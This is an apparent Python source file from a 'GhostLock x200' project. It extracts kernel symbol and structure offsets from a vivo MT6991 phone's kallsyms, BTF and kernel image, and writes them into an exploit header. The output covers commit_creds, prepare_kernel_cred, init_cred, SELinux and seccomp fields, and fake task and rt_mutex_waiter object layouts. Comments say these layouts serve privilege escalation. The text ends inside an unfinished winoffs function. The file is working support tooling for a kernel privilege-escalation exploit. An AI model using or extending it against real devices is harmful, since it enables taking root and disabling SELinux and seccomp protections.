#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 GhostLock-X200 contributors
"""
offsets_auto.py — 全量偏移提取器 (GhostLock x200 / vivo MT6991)

把"编译期硬编码"与"运行时动态值"全部自动化，只需 3 个输入：
  1. kallsyms 转储 (设备 /proc/kallsyms 或 ELF .symtab)
  2. vmlinux BTF  (/sys/kernel/btf/vmlinux 或 ELF 内嵌)
  3. kernel ELF  (boot.img 解出的 vmlinux, 用于镜像固有偏移/反汇编窗口)

子命令:
  live   <kallsyms.txt> <vmlinux.btf> <win_offs.json> <out.json>
         # 运行时动态值 (STAGE3.4 原功能, 输出格式不变, 零版本硬编码)
  header <kallsyms.txt> <vmlinux.btf> [-o target_x200.h]
         [--w2host w2host.c] [--diff 旧target.h]
         # 编译期全量偏移 → 生成完整 target_x200.h (+ 同步 w2host.c 的
         #   TASK_CRED_OFF/TASK_COMM_OFF), 可选与旧头文件对比
  winoffs <kernel.elf> <out_win_offs.json> [--task-cred-off 0x820]
         # 镜像固有偏移 (physmap_base + sym_offs + w2host 采样窗口)
         # 依赖 capstone (win_extract.py 迁移)
  all    <kallsyms> <btf> <kernel.elf> <outdir>
         # 一键: header + winoffs + offsets.json

兼容性:
  - 符号: 精确名 + Rust 修饰名模糊回退 (ashmem fops_*...ashmem_rust6Ashmem 等)
  - 结构: 完整 BTF 图解析 (RANDSTRUCT 匿名结构/联合递归, 位域 kflag)
  - 校验: 生成后与已知 target_x200.h 对比, 缺失必需符号即失败 (不猜)
"""

import sys, os, json, re, struct


# ============================================================
# 1. kallsyms / ELF 符号解析
# ============================================================

def parse_kallsyms(path):
    """返回 (syms: 名字->首个地址, stype, sym_all: 名字->全部地址)."""
    syms, stype, sym_all = {}, {}, {}
    for line in open(path, errors="replace"):
        p = line.split()
        if len(p) >= 3:
            try:
                a = int(p[0], 16)
            except ValueError:
                continue
            if a:
                if p[2] not in syms:
                    syms[p[2]] = a
                    stype[p[2]] = p[1]
                sym_all.setdefault(p[2], []).append(a)
    return syms, stype, sym_all


def parse_elf_symtab(path):
    """从 ELF .kernel/.symtab 提取符号表 + 静态 text 基址 (无需 pyelftools)."""
    data = open(path, "rb").read()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = {}
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = \
            struct.unpack_from("<IIQQQQ", data, off)
        sections[i] = dict(name_off=sh_name, type=sh_type, addr=sh_addr,
                           offset=sh_offset, size=sh_size)
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr["offset"]:shstr["offset"] + shstr["size"]]

    def sec_name(i):
        o = sections[i]["name_off"]
        e = shstr_data.find(b"\0", o)
        return shstr_data[o:e].decode(errors="replace")

    names = {i: sec_name(i) for i in sections}
    kern_sec = next((sections[i] for i in sections if names[i] == ".kernel"), None)
    sym_sec = next((sections[i] for i in sections if names[i] == ".symtab"), None)
    str_sec = next((sections[i] for i in sections if names[i] == ".strtab"), None)
    if not (kern_sec and sym_sec and str_sec):
        return None, None
    strdata = data[str_sec["offset"]:str_sec["offset"] + str_sec["size"]]
    syms, stype = {}, {}
    entsize = sym_sec["size"] // (sym_sec["size"] // 24) if sym_sec["size"] else 24
    # 标准 entsize=24, 逐个解析
    n = sym_sec["size"] // 24
    for i in range(n):
        st_name, st_info, st_other, st_shndx, st_value, st_size = \
            struct.unpack_from("<IBBHQQ", data, sym_sec["offset"] + i * 24)
        if st_shndx == 0 or st_value == 0:
            continue
        e = strdata.find(b"\0", st_name)
        name = strdata[st_name:e].decode(errors="replace")
        if name and name not in syms:
            syms[name] = st_value
            stype[name] = chr(st_info & 0xF) if (st_info & 0xF) else "?"
    return syms, kern_sec["addr"]


def find_sym(syms, want):
    """精确匹配, 失败时 Rust 修饰名/子串模糊回退."""
    if want in syms:
        return syms[want]
    # Rust 修饰回退规则 (依 GhostLock-for-OnePlus extract_target.py)
    rust_frags = {
        "ashmem_ioctl": ("fops_ioctl", "ashmem_rust6Ashmem", "6AshmemE5ioctl"),
        "compat_ashmem_ioctl": ("fops_compat_ioctl", "ashmem_rust6Ashmem",
                                "6AshmemE12compat_ioctl"),
        "ashmem_mmap": ("fops_mmap", "ashmem_rust6Ashmem", "6AshmemE4mmap"),
        "ashmem_open": ("fops_open", "ashmem_rust6Ashmem", "6AshmemE4open"),
        "ashmem_release": ("fops_release", "ashmem_rust6Ashmem", "6AshmemE7release"),
        "ashmem_show_fdinfo": ("fops_show_fdinfo", "ashmem_rust6Ashmem",
                               "6AshmemE11show_fdinfo"),
        "ashmem_fops": ("ashmem_fops", "Ashmem"),
    }
    if want in rust_frags:
        frags = rust_frags[want]
        for name, addr in syms.items():
            low = name.lower()
            if "toggle" in low:
                continue
            if all(f in name for f in frags):
                return addr
    # 通用: 唯一子串匹配 (结尾锚定优先)
    hits = [addr for name, addr in syms.items() if want in name]
    if len(hits) == 1:
        return hits[0]
    return None


# ============================================================
# 2. BTF 完整解析 (类型图, RANDSTRUCT 匿名成员递归)
# ============================================================

def parse_btf_full(path):
    """解析 vmlinux BTF → 1-based types 列表.
    rec: {id, kind, name, size, members:[{name,type,bit}]}"""
    data = open(path, "rb").read()
    magic, ver, flags, hdr_len, type_off, type_len, str_off, str_len = \
        struct.unpack_from("<HBBIIIII", data, 0)
    if magic != 0xEB9F:
        raise ValueError("not a BTF file (magic)")
    strs = data[hdr_len + str_off: hdr_len + str_off + str_len]

    def sname(o):
        e = strs.find(b"\0", o)
        return strs[o:e].decode(errors="replace") if 0 <= o < len(strs) else ""

    types = [None]
    off = hdr_len + type_off
    end = off + type_len
    tid = 1
    while off < end:
        name_off, info, st = struct.unpack_from("<III", data, off)
        off += 12
        kind = (info >> 24) & 0x1F
        vlen = info & 0xFFFF
        kflag = (info >> 31) & 1
        rec = {"id": tid, "kind": kind, "name": sname(name_off),
               "size": st, "members": []}
        if kind in (4, 5):                      # STRUCT / UNION
            for _ in range(vlen):
                mno, mtype, moff = struct.unpack_from("<III", data, off)
                off += 12
                rec["members"].append(
                    {"name": sname(mno), "type": mtype,
                     "bit": (moff & 0xFFFFFF) if kflag else moff})
        elif kind in (6, 13):                   # ENUM / FUNC_PROTO (vlen*8)
            off += vlen * 8
        elif kind in (15, 19):                  # DATASEC / ENUM64 (vlen*12)
            off += vlen * 12
        elif kind in (1, 14, 16, 17):           # INT / VAR / FLOAT / DECL_TAG
            off += 4
        # PTR/ARRAY/FWD/TYPEDEF/VOLATILE/CONST/RESTRICT/FUNC/TYPE_TAG: 无附加
        types.append(rec)
        tid += 1
    return types


def btf_find(types, name, kind=4):
    return [t for t in types[1:] if t["kind"] == kind and t["name"] == name]


def btf_resolve_member(types, tid, name, base=0, depth=0, seen=None):
    """递归查找成员 (穿过匿名 struct/union), 返回绝对字节偏移或 None."""
    if seen is None:
        seen = set()
    if tid is None or tid <= 0 or tid >= len(types) or depth > 16 or tid in seen:
        return None
    seen.add(tid)
    t = types[tid]
    if t is None:
        return None
    for m in t["members"]:
        if m["name"] == name:
            return base + (m["bit"] >> 3)
    for m in t["members"]:
        if m["name"] == "":
            r = btf_resolve_member(types, m["type"], name,
                                   base + (m["bit"] >> 3), depth + 1, seen)
            if r is not None:
                return r
    return None


def btf_member(types, t, name):
    """直接成员 (非匿名) 字节偏移."""
    for m in t["members"]:
        if m["name"] == name:
            return m["bit"] >> 3
    return None


def btf_struct_size(types, name):
    hits = btf_find(types, name)
    return max(t["size"] for t in hits) if hits else None


def btf_find_anon_mm(types):
    """mm_struct 因 __randomize_layout 以匿名名出现: 特征成员 pgd+owner+mmap."""
    for t in types[1:]:
        if t["kind"] != 4 or t["name"]:
            continue
        names = {m["name"] for m in t["members"]}
        if "pgd" in names and "owner" in names and "mm_users" in names:
            return t
    return None


# ============================================================
# 3. 提取规则 (事实来源: b57 target_x200.h + kallsyms/BTF 实证)
# ============================================================

# (define, 符号名, 附加偏移, 是否必需)
SYMBOL_RULES = [
    ("INIT_TASK_OFF",            "init_task",            0x00, True),
    ("ROOT_TASK_GROUP_OFF",      "root_task_group",      0x00, True),
    ("SELINUX_ENFORCING_OFF",    "selinux_state",        0x00, True),
    ("SELINUX_BLOB_SIZES_OFF",   "selinux_blob_sizes",   0x00, True),
    ("SECURITY_HOOK_HEADS_OFF",  "security_hook_heads",  0x00, True),
    ("KMALLOC_CACHES_OFF",       "kmalloc_caches",       0x00, True),
    ("ANON_PIPE_BUF_OPS_OFF",    "anon_pipe_buf_ops",    0x00, True),
    ("CONFIGFS_READ_ITER_OFF",       "configfs_read_iter",     0x00, True),
    ("CONFIGFS_BIN_WRITE_ITER_OFF",  "configfs_bin_write_iter",0x00, True),
    ("COPY_SPLICE_READ_OFF",     "copy_splice_read",     0x00, True),
    ("NOOP_LLSEEK_OFF",          "noop_llseek",          0x00, True),
    ("ASHMEM_MISC_FOPS_OFF",     "ashmem_misc",          0x10, True),  # miscdevice.fops
    ("ASHMEM_FOPS_OFF",          "ashmem_fops",          0x00, True),
    ("ASHMEM_IOCTL_OFF",         "ashmem_ioctl",         0x00, True),
    ("ASHMEM_COMPAT_IOCTL_OFF",  "compat_ashmem_ioctl",  0x00, True),
    ("ASHMEM_MMAP_OFF",          "ashmem_mmap",          0x00, True),
    ("ASHMEM_OPEN_OFF",          "ashmem_open",          0x00, True),
    ("ASHMEM_RELEASE_OFF",       "ashmem_release",       0x00, True),
    ("ASHMEM_SHOW_FDINFO_OFF",   "ashmem_show_fdinfo",   0x00, True),
    ("SLIDE_NFULNL_LOGGER_OFF",      "nfulnl_logger",    0x00, True),
    ("SLIDE_LOGGERS_0_1_OFF",        "loggers",          0x00, True),
    ("SLIDE_RANDOM_BOOT_ID_DATA_OFF","sysctl_bootid",    0x00, True),
    ("SLIDE_SYSCTL_BOOTID_OFF",      "sysctl_bootid",    0x00, True),
    ("SLIDE_INIT_CRED_OFF",      "init_cred",            0x00, True),
]

# 运行时 win_offs/offsets.json 用 (非 header)
RUNTIME_SYMBOLS = [
    ("selinux_state",       0x00, True),
    ("kptr_restrict",       0x00, True),
    ("init_cred",           0x00, True),
    ("init_user_ns",        0x00, True),
    ("__dump_skip.zeroes",  0x00, True),   # 宿主 GL_LOCK 全零区
    ("commit_creds",        0x00, True),
    ("prepare_kernel_cred", 0x00, True),
    ("__arm64_sys_getuid",  0x00, True),
    ("__arm64_sys_geteuid", 0x00, True),
    ("__arm64_sys_getresuid",0x00, True),
]

# BTF 结构字段: (结构名, 字段名, define)
BTF_FIELD_RULES = [
    # task_struct → FAKE_TASK_* / TASK_*
    ("task_struct", "usage",          "FAKE_TASK_USAGE_OFF"),
    ("task_struct", "prio",           "FAKE_TASK_PRIO_OFF"),
    ("task_struct", "normal_prio",    "FAKE_TASK_NORMAL_PRIO_OFF"),
    ("task_struct", "sched_task_group","FAKE_TASK_TASK_GROUP_OFF"),
    ("task_struct", "pi_lock",        "FAKE_TASK_PI_LOCK_OFF"),
    ("task_struct", "pi_waiters",     "FAKE_TASK_PI_WAITERS_OFF"),
    ("task_struct", "pi_top_task",    "FAKE_TASK_PI_TOP_TASK_OFF"),
    ("task_struct", "pi_blocked_on",  "FAKE_TASK_PI_BLOCKED_ON_OFF"),
    ("task_struct", "pid",            "TASK_PID_OFF"),
    ("task_struct", "tgid",           "TASK_TGID_OFF"),
    ("task_struct", "real_parent",    "TASK_REAL_PARENT_OFF"),
    ("task_struct", "atomic_flags",   "TASK_ATOMIC_FLAGS_OFF"),
    ("task_struct", "real_cred",      "TASK_REAL_CRED_OFF"),
    ("task_struct", "cred",           "TASK_CRED_OFF"),
    ("task_struct", "comm",           "TASK_COMM_OFF"),
    ("task_struct", "tasks",          "TASK_TASKS_OFF"),
    ("task_struct", "seccomp",        "TASK_SECCOMP_OFF"),
    # cred
    ("cred", "uid",                   "CRED_UID_OFF"),
    ("cred", "securebits",            "CRED_SECUREBITS_OFF"),
    ("cred", "cap_inheritable",       "CRED_CAPS_OFF"),
    ("cred", "security",              "CRED_SECURITY_OFF"),
    # seccomp
    ("seccomp", "mode",               "SECCOMP_MODE_OFF"),
    ("seccomp", "filter_count",       "SECCOMP_FILTER_COUNT_OFF"),
    ("seccomp", "filter",             "SECCOMP_FILTER_OFF"),
    # file_operations
    ("file_operations", "owner",          "FOPS_OWNER_OFF"),
    ("file_operations", "llseek",         "FOPS_LLSEEK_OFF"),
    ("file_operations", "read",           "FOPS_READ_OFF"),
    ("file_operations", "write",          "FOPS_WRITE_OFF"),
    ("file_operations", "read_iter",      "FOPS_READ_ITER_OFF"),
    ("file_operations", "write_iter",     "FOPS_WRITE_ITER_OFF"),
    ("file_operations", "unlocked_ioctl", "FOPS_IOCTL_OFF"),
    ("file_operations", "compat_ioctl",   "FOPS_COMPAT_IOCTL_OFF"),
    ("file_operations", "mmap",           "FOPS_MMAP_OFF"),
    ("file_operations", "open",           "FOPS_OPEN_OFF"),
    ("file_operations", "release",        "FOPS_RELEASE_OFF"),
    ("file_operations", "splice_read",    "FOPS_SPLICE_READ_OFF"),
    ("file_operations", "show_fdinfo",    "FOPS_SHOW_FDINFO_OFF"),
    # configfs_buffer → CFG_* (util.c 构造 configfs 伪对象)
    ("configfs_buffer", "page",           "CFG_PAGE_OFF"),
    ("configfs_buffer", "needs_read_fill","CFG_NEEDS_READ_FILL_OFF"),
    ("configfs_buffer", "bin_buffer",     "CFG_BIN_BUFFER_OFF"),
    ("configfs_buffer", "bin_buffer_size","CFG_BIN_BUFFER_SIZE_OFF"),
    ("configfs_buffer", "cb_max_size",    "CFG_CB_MAX_SIZE_OFF"),
    # task_security_struct → SELINUX_CRED_*
    ("task_security_struct", "osid",      "SELINUX_CRED_OSID_OFF"),
    ("task_security_struct", "sid",       "SELINUX_CRED_SID_OFF"),
    # rt_mutex_waiter 真实布局 (RANDSTRUCT, 信息/校验用; WAITER_* 当前为死代码)
    ("rt_mutex_waiter", "tree",       "WAITER_TREE_ENTRY_OFF"),
    ("rt_mutex_waiter", "pi_tree",     "WAITER_PI_TREE_ENTRY_OFF"),
    ("rt_mutex_waiter", "task",        "WAITER_TASK_OFF"),
    ("rt_mutex_waiter", "lock",        "WAITER_LOCK_OFF"),
    ("rt_mutex_waiter", "wake_state",  "WAITER_WAKE_STATE_OFF"),
    ("rt_mutex_waiter", "ww_ctx",      "WAITER_WW_CTX_OFF"),
    # selinux_state.enforcing (运行时 offsets.json)
    ("selinux_state", "enforcing",     "SELINUX_STATE_ENFORCING_FIELD"),
]

# 结构大小
BTF_SIZE_RULES = [
    ("page",            "STRUCT_PAGE_SIZE"),     # 0x40
    ("pipe_buffer",     "PIPE_BUFFER_SIZE"),     # 0x28
]


# ============================================================
# 4. header 模板常量 (平台/exploit 布局, 与内核版本无关)
# ============================================================

TEMPLATE_HEADER = r"""/* AUTO-GENERATED by offsets_auto.py — 全量偏移提取器
 * 生成时间: {ts}
 * 输入: kallsyms + vmlinux BTF {extra}
 * 符号偏移来自 kallsyms 实证; 结构偏移来自 BTF (含 RANDSTRUCT 真实布局).
 * 警告: 本文件由工具生成, 请勿手改; 重新生成请运行
 *   python tools/offset_tools/offsets_auto.py header <kallsyms> <btf> -o exploit/src/target_x200.h
 */
#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "{variant}"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "{fingerprint}"
#endif

#define KIMAGE_TEXT_BASE {kimage_base}ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL /* PAGE_OFFSET: VA_BITS39 direct map low half 256GB */
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL /* 64GB */
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ===== 符号偏移 (kallsyms 实证, 相对 KIMAGE_TEXT_BASE) ===== */
{symbols}

{address_macros}

/* ===== slide 路由专用符号 ===== */
{slide_symbols}

{slide_macros}

/* ===== 结构偏移 (BTF 实证) ===== */
/* rt_mutex_waiter 真实布局 (RANDSTRUCT). 注意: WAITER_* 当前为死代码,
 * 实际提权用 FAKE_WAITER_* (exploit 自建假对象布局, 见下). */
{waiter}

/* 假 waiter 布局 (exploit 内部, 与内核版本无关; 建议与 BTF rt_mutex_waiter 一致) */
{fake_waiter}

/* task_struct / mm_struct / cred / seccomp (BTF) */
{task_offsets}

{cred_offsets}

{seccomp_offsets}

/* struct page (BTF size + 稳定联合偏移) */
{page_offsets}

/* pipe (BTF size + 稳定常量) */
{pipe_offsets}

/* file_operations (BTF) */
{fops_offsets}

/* configfs_buffer (BTF) → util.c 构造 configfs 伪对象 */
{cfg_offsets}

/* ===== exploit 假对象内部布局 (与内核版本无关, 勿改) ===== */
#define LOCK_OFF      0x1350
#define W0_OFF        0x2220
#define FOPS_OFF      0x1000
#define SCRATCH_OFF   0x3000
#define RIGHT_OFF     0x4440
#define LEFT_OFF      0x5550
#define FAKE_TASK_OFF 0x3200

#define WAITER_LOCAL_OFF 0x80

#endif
"""


# ============================================================
# 5. 生成器
# ============================================================

def extract_symbols(syms, stype, sym_all):
    """返回 (define->rel_offset, 缺漏列表, 运行时 rel 表)."""
    base = syms.get("_text")
    if not base:
        raise SystemExit("FATAL: kallsyms 无 _text, 无法计算相对偏移")
    out, missing = {}, []
    for define, sym, delta, req in SYMBOL_RULES:
        addr = find_sym(syms, sym)
        if addr is None:
            if req:
                missing.append((define, sym))
            continue
        out[define] = addr - base + delta
    runtime = {}
    for sym, delta, req in RUNTIME_SYMBOLS:
        addr = find_sym(syms, sym)
        if addr is None:
            if req:
                missing.append(("RUNTIME:" + sym, sym))
            continue
        runtime[sym] = addr - base + delta
    return out, missing, runtime, base


def extract_btf(types):
    """返回 (define->offset, 缺漏列表, 额外信息)."""
    out, missing, extra = {}, [], {}
    structs = {}
    for sn, fld, define in BTF_FIELD_RULES:
        if sn not in structs:
            hits = btf_find(types, sn)
            structs[sn] = max(hits, key=lambda t: len(t["members"])) if hits else None
        t = structs[sn]
        if t is None:
            missing.append((define, sn + "." + fld))
            continue
        v = btf_member(types, t, fld)
        if v is None:
            v = btf_resolve_member(types, t["id"], fld)
        if v is None:
            missing.append((define, sn + "." + fld))
            continue
        out[define] = v
    for sn, define in BTF_SIZE_RULES:
        sz = btf_struct_size(types, sn)
        if sz is None:
            missing.append((define, "sizeof(" + sn + ")"))
        else:
            out[define] = sz
    mm = btf_find_anon_mm(types)
    if mm is not None:
        owner = btf_member(types, mm, "owner")
        if owner is not None:
            out["MM_OWNER_OFF"] = owner
    else:
        missing.append(("MM_OWNER_OFF", "mm_struct(anon).owner"))
    # 校验信息: FAKE_WAITER_* 应与真实 rt_mutex_waiter 一致
    rtw = structs.get("rt_mutex_waiter")
    if rtw is not None:
        extra["rt_mutex_waiter"] = {
            m["name"]: m["bit"] >> 3 for m in rtw["members"] if m["name"]}
    return out, missing, extra


def gen_header(sym_off, btf_off, opts):
    variant = opts.get("variant", "x200_release")
    fp = opts.get("fingerprint",
                  "vivo/PD2415/PD2415:16/BP2A.250605.031.A3_V000L1/"
                  "compiler260430161853:user/release-keys")
    kb = opts.get("kimage_base", "0xffffffc080000000")

    def off(define, default=None):
        v = sym_off.get(define, btf_off.get(define, default))
        return ("0x%08xULL" % v) if v is not None else ("/* MISSING " + define + " */ 0x0ULL")

    main_defs = [d for d, _s, _d, _r in SYMBOL_RULES
                 if d in sym_off and not d.startswith("SLIDE_")]
    slide_defs = [d for d, _s, _d, _r in SYMBOL_RULES
                  if d in sym_off and d.startswith("SLIDE_")]
    sym_lines = []
    for define, sym, delta, req in SYMBOL_RULES:
        if define in main_defs:
            sym_lines.append("#define %-32s 0x%08xULL%s" % (
                define, sym_off[define],
                "  /* %s%s */" % (sym, ("+0x%x" % delta) if delta else "")))
    sym_text = "\n".join(sym_lines)
    addr_macros = "\n".join(
        "#define %-24s (KIMAGE_TEXT_BASE + %s)" % (define[:-4], define)
        for define in main_defs)

    slide_lines = []
    for define, sym, delta, req in SYMBOL_RULES:
        if define in slide_defs:
            slide_lines.append("#define %-32s 0x%08xULL%s" % (
                define, sym_off[define],
                "  /* %s%s */" % (sym, ("+0x%x" % delta) if delta else "")))
    slide_text = "\n".join(slide_lines)
    slide_text += "\n#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF"
    slide_text += "\n#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF"
    slide_macros = "\n".join(
        "#define %-28s \\\n  (KIMAGE_TEXT_BASE + %s)" % (define[:-4] + "_IMAGE", define)
        for define in ("SLIDE_NFULNL_LOGGER_OFF", "SLIDE_LOGGERS_0_1_OFF",
                       "SLIDE_RANDOM_BOOT_ID_DATA_OFF", "SLIDE_INIT_TASK_OFF",
                       "SLIDE_ROOT_TASK_GROUP_OFF", "SLIDE_SYSCTL_BOOTID_OFF")
        if define in sym_off or define in ("SLIDE_INIT_TASK_OFF",
                                           "SLIDE_ROOT_TASK_GROUP_OFF"))

    waiter = "\n".join(
        "#define %-28s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("WAITER_TREE_ENTRY_OFF", "WAITER_PI_TREE_ENTRY_OFF",
                  "WAITER_TASK_OFF", "WAITER_LOCK_OFF", "WAITER_WAKE_STATE_OFF",
                  "WAITER_WW_CTX_OFF"))
    # prio/deadline 不在 BTF (本内核已移除): 按假对象惯例派生 tree+0x18/0x20
    waiter += "\n#define WAITER_PRIO_OFF        0x18  /* 派生: tree+0x18 (BTF 无 prio) */"
    waiter += "\n#define WAITER_DEADLINE_OFF    0x20  /* 派生: tree+0x20 (BTF 无 deadline) */"

    fake_waiter = """#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68"""

    task_offsets = "\n".join(
        "#define %-28s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("FAKE_TASK_USAGE_OFF", "FAKE_TASK_PRIO_OFF",
                  "FAKE_TASK_NORMAL_PRIO_OFF", "FAKE_TASK_TASK_GROUP_OFF",
                  "FAKE_TASK_PI_LOCK_OFF", "FAKE_TASK_PI_WAITERS_OFF",
                  "FAKE_TASK_PI_TOP_TASK_OFF", "FAKE_TASK_PI_BLOCKED_ON_OFF",
                  "MM_OWNER_OFF", "TASK_PID_OFF", "TASK_TGID_OFF",
                  "TASK_REAL_PARENT_OFF", "TASK_ATOMIC_FLAGS_OFF",
                  "TASK_REAL_CRED_OFF", "TASK_CRED_OFF", "TASK_COMM_OFF",
                  "TASK_TASKS_OFF", "TASK_SECCOMP_OFF"))
    task_offsets += "\n#define TASK_THREAD_INFO_FLAGS_OFF 0x00"

    cred_offsets = "\n".join(
        "#define %-24s 0x%x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("CRED_UID_OFF", "CRED_SECUREBITS_OFF", "CRED_CAPS_OFF",
                  "CRED_SECURITY_OFF", "SELINUX_CRED_OSID_OFF",
                  "SELINUX_CRED_SID_OFF"))
    cred_offsets += "\n#define SELINUX_CRED_BLOB_OFF 0"

    seccomp_offsets = "\n".join(
        "#define %-28s 0x%02x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("SECCOMP_MODE_OFF", "SECCOMP_FILTER_COUNT_OFF",
                  "SECCOMP_FILTER_OFF"))
    seccomp_offsets += ("\n#define TIF_SECCOMP_BIT           11   "
                        "/* arch/arm64 thread_info.h 实证 */")
    seccomp_offsets += ("\n#define PFA_NO_NEW_PRIVS_BIT      0    "
                        "/* sched.h 实证 (vivo 与上游不同) */")

    page_offsets = ("#define STRUCT_PAGE_SIZE             0x%x\n" % btf_off["STRUCT_PAGE_SIZE"]
                    if "STRUCT_PAGE_SIZE" in btf_off else "")
    page_offsets += ("#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08\n"
                     "#define STRUCT_SLAB_CACHE_OFF         0x08\n"
                     "#define STRUCT_PAGE_TYPE_OFF          0x30\n")

    pipe_offsets = ("#define PIPE_BUFFER_SIZE             0x%x\n" % btf_off["PIPE_BUFFER_SIZE"]
                    if "PIPE_BUFFER_SIZE" in btf_off else "")
    pipe_offsets += ("#define PIPE_BUFFER_SLOTS            32   "
                     "/* exploit 策略 (F_SETPIPE_SZ), 非内核布局 */\n")
    pipe_offsets += "#define PIPE_BUF_FLAG_CAN_MERGE      0x10\n"

    fops_offsets = "\n".join(
        "#define %-28s 0x%02x" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0x0" % (d, d)
        for d in ("FOPS_OWNER_OFF", "FOPS_LLSEEK_OFF", "FOPS_READ_OFF",
                  "FOPS_WRITE_OFF", "FOPS_READ_ITER_OFF", "FOPS_WRITE_ITER_OFF",
                  "FOPS_IOCTL_OFF", "FOPS_COMPAT_IOCTL_OFF", "FOPS_MMAP_OFF",
                  "FOPS_OPEN_OFF", "FOPS_RELEASE_OFF", "FOPS_SPLICE_READ_OFF",
                  "FOPS_SHOW_FDINFO_OFF"))

    cfg_offsets = "\n".join(
        "#define %-28s %d" % (d, btf_off[d]) if d in btf_off
        else "/* MISSING %s */ #define %s 0" % (d, d)
        for d in ("CFG_PAGE_OFF", "CFG_NEEDS_READ_FILL_OFF",
                  "CFG_BIN_BUFFER_OFF", "CFG_BIN_BUFFER_SIZE_OFF",
                  "CFG_CB_MAX_SIZE_OFF"))

    return TEMPLATE_HEADER.format(
        ts=opts.get("ts", ""),
        extra=opts.get("extra", ""),
        variant=variant,
        fingerprint=fp,
        kimage_base=kb,
        symbols=sym_text,
        address_macros=addr_macros,
        slide_symbols=slide_text,
        slide_macros=slide_macros,
        waiter=waiter,
        fake_waiter=fake_waiter,
        task_offsets=task_offsets,
        cred_offsets=cred_offsets,
        seccomp_offsets=seccomp_offsets,
        page_offsets=page_offsets,
        pipe_offsets=pipe_offsets,
        fops_offsets=fops_offsets,
        cfg_offsets=cfg_offsets)


def patch_w2host(path, btf_off):
    """同步 w2host.c 的 TASK_CRED_OFF / TASK_COMM_OFF (BTF 实证)."""
    src = open(path, encoding="utf-8").read()
    repl = {
        "#define TASK_CRED_OFF 0x820": "#define TASK_CRED_OFF 0x%x" % btf_off["TASK_CRED_OFF"],
        "#define TASK_COMM_OFF 0x830": "#define TASK_COMM_OFF 0x%x" % btf_off["TASK_COMM_OFF"],
    }
    changed = []
    for old, new in repl.items():
        if old in src:
            src = src.replace(old, new, 1)
            changed.append(new)
        elif ("TASK_CRED_OFF" in old and "#define TASK_CRED_OFF" not in src):
            # 无旧值, 插入
            pass
    if changed:
        open(path, "w", encoding="utf-8", newline="").write(src)
    return changed


# ============================================================
# 6. winoffs (win_extract.py 迁移: 镜像固有偏移)
# ============================================================

def gen_winoffs(elf_path, task_cred_off, out_path):
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

    data = open(elf_path, "rb").read()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = {}
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = \
            struct.unpack_from("<IIQQQQ", data, off)
        sections[i] = dict(name_off=sh_name, addr=sh_addr, offset=sh_offset,
                           size=sh_size)
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr["offset"]:shstr["offset"] + shstr["size"]]

    def sec_name(i):
        o = sections[i]["name_off"]
        e = shstr_data.find(b"\0", o)
        return shstr_data[o:e].decode(errors="replace")

    names = {i: sec_name(i) for i in sections}
    kern_sec = next((sections[i] for i in sections if names[i] == ".kernel"), None)
    sym_sec = next((sections[i] for i in sections if names[i] == ".symtab"), None)
    str_sec = next((sections[i] for i in sections if names[i] == ".strtab"), None)
    if not (kern_sec and sym_sec and str_sec):
        raise SystemExit("FATAL: ELF 缺少 .kernel/.symtab/.strtab")
    base = kern_sec["addr"]
    kern = data[kern_sec["offset"]:kern_sec["offset"] + kern_sec["size"]]
    strdata = data[str_sec["offset"]:str_sec["offset"] + str_sec["size"]]
    syms = {}
    for i in range(sym_sec["size"] // 24):
        st_name, st_info, st_other, st_shndx, st_value, st_size = \
            struct.unpack_from("<IBBHQQ", data, sym_sec["offset"] + i * 24)
        if st_shndx == 0 or st_value == 0:
            continue
        e = strdata.find(b"\0", st_name)
        name = strdata[st_name:e].decode(errors="replace")
        if name and name not in syms:
            syms[name] = st_value

    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    md.detail = True

